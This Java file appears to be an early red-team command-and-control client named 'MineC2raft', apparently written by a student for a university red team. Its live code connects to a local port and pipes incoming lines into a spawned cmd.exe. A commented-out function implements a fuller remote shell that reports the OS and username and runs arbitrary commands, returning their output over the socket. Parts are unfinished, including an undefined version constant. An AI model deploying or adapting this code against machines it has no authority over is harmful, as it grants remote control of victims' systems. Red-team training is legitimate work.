import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.SocketException;
import java.util.concurrent.TimeUnit;
public class Client {

public static void main(String args[]) throws Exception {
        // listen();
        // doMyBidding("127.0.0.1", 2000);
        // clientRunner();
    Socket socket = new Socket("localhost", 50000);
    BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
    PrintWriter writer = new PrintWriter(socket.getOutputStream());

    createThread(reader, writer);
    // clientRunner(reader, writer);
    socket.close();
}

public static void createThread(BufferedReader reader, PrintWriter writer) throws IOException{
    ProcessBuilder pb = new ProcessBuilder();
    pb.command("cmd.exe", "/K");
    pb.redirectErrorStream(true);
    Process shell = pb.start();

    BufferedWriter shellIn = new BufferedWriter(new OutputStreamWriter(shell.getOutputStream()));

    new Thread(() -> {

        try {
            String line = "";
            System.out.println("line: " + line);
            while ((line = reader.readLine()) != null) {
                shellIn.write(line);
                shellIn.newLine(); // enter
                shellIn.flush();

                writer.println(line);
            }
        } catch (IOException e) {
            System.out.println("Connection Closed.");
        }
    }).start();
}


// public static void clientRunner(BufferedReader reader, PrintWriter writer) throws Exception {
//     String userIn = "";
//     while(!userIn.equals("done")) {
//         try {
//             TimeUnit.SECONDS.sleep(1);
//             createThread(reader, writer);
//         } catch (SocketException e) {
//             System.out.println("Cannot resolve to host. Retrying...");
//         }

//     }
// }

// public static void doMyBidding(String host, int port) throws IOException, InterruptedException{
//     Socket clientSocket = new Socket(host, port);
//     String cmd = "";
//     String reply = "";
//     ProcessBuilder pb = new ProcessBuilder();
//     pb.command("cmd.exe", "/K");
//     pb.redirectErrorStream(true);

//     BufferedReader socketIn = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
//     DataOutputStream socketOut = new DataOutputStream(clientSocket.getOutputStream());

//     Process shell = pb.start();

//     BufferedWriter shellIn = new BufferedWriter(new OutputStreamWriter(shell.getOutputStream()));
//     BufferedReader shellOut = new BufferedReader(new InputStreamReader(shell.getInputStream()));
    
//     System.out.println("Connected.");
                    
//     while((cmd = socketIn.readLine()) != null && !cmd.equals("done")) {
//         switch(cmd) {
//             case "os":
//                 reply = System.getProperty("os.name")+ " " + System.getProperty("os.version");
//                 socketOut.writeBytes(reply + "\n");
//                 socketOut.write("__END__\n".getBytes());
//                 break;
//             case "user":
//                 reply = System.getProperty("user.name");
//                 socketOut.writeBytes(reply + "\n");
//                 socketOut.write("__END__\n".getBytes());
//                 break;
//             case "HELP": 
//                 reply = "               ********** MineC2raft Commands *********** \n\n\t\tos: prints the os of the client.\n\t\tuser: prints the name of the client.\n\t\tdone: exits the client port\nt\\tabout: about the program.\n\nWINDOWS ONLY\n(Maybe i'll add linux soon) but like lowk you can use a remote terminal \nThats all you need to know foo";
//                 socketOut.writeBytes(reply + "\n");
//                 socketOut.write("__END__\n".getBytes());
//                 break;
//             case "poop":
//                 reply = "poop";
//                 System.out.println("poop");
//                 socketOut.writeBytes(reply + "\n");
//                 socketOut.write("__END__\n".getBytes());
//                 break;
//             case "about":
//                 reply = "░▒▓ MINEC2RAFT ▓▒░\nVersion: " + VERSION_NUM + "\nWritten by Austin Hall for RIT's Red Team.\nWritten for fun too lowk...\n\nA dud?\n/give @p minecraft:oak_sapling";
//                 socketOut.writeBytes(reply + "\n");
//                 socketOut.write("__END__\n".getBytes());
//                 break;                
//             default: 
//             shellIn.write(cmd + " & echo __END__");
//             shellIn.newLine(); // simulate Enter
            
//             shellIn.flush();
            
//             Thread.sleep(50);
//             String line;
//             shellOut.readLine();
//             while ((line = shellOut.readLine()) != null) {
//                 if(line.equals("__END__")) {
//                     break;
//                 }
//                 socketOut.writeBytes(line + "\n");

//             }
//             socketOut.writeBytes("__END__\n");
//             socketOut.flush();
//             break;

//         }
//     }
    
//     clientSocket.close();
//     socketIn.close();
//     socketOut.close();
//     shellIn.close();
//     shellOut.close();
// }

// public static void listen() throws Exception{
//     Socket csock = new Socket("127.0.0.1",2000);
//     String message = "";
//     BufferedReader inkbd = new BufferedReader(new InputStreamReader(System.in));
    
//     while(!message.equals("done")) {
//             DataOutputStream ou = new DataOutputStream(csock.getOutputStream());    
//             System.out.println("Type message: ");
//             message = inkbd.readLine();        
//             ou.writeBytes(message);

//         }
//         csock.close();
//     System.out.println("Disconnected.");
// }
}